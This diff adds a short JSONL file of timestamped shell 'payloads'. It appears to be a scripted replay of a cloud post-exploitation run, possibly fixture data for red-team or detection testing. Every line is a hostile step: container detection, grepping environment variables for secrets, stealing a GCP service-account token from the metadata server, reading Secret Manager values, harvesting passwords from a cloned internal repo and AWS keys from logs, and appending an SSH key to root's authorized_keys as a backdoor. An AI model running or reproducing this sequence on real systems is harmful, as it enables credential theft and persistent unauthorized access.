@@ -1,0 +1,9 @@
+{"t": 0, "payload": "cat /proc/1/cgroup"}
+{"t": 9, "payload": "env | grep -iE 'KEY|TOKEN|SECRET|PASS'"}
+{"t": 18, "payload": "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}
+{"t": 27, "payload": "gcloud secrets list --format=json"}
+{"t": 36, "payload": "gcloud secrets versions access latest --secret=db-password"}
+{"t": 45, "payload": "git clone https://git.internal.example/platform/infra.git /tmp/w/infra"}
+{"t": 54, "payload": "grep -rniE 'password|secret|api[_-]?key' /tmp/w/infra"}
+{"t": 63, "payload": "zgrep -hoE 'AKIA[0-9A-Z]{16}' /var/log/app/*.log*"}
+{"t": 72, "payload": "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLE0 svc@example' >> /root/.ssh/authorized_keys"}
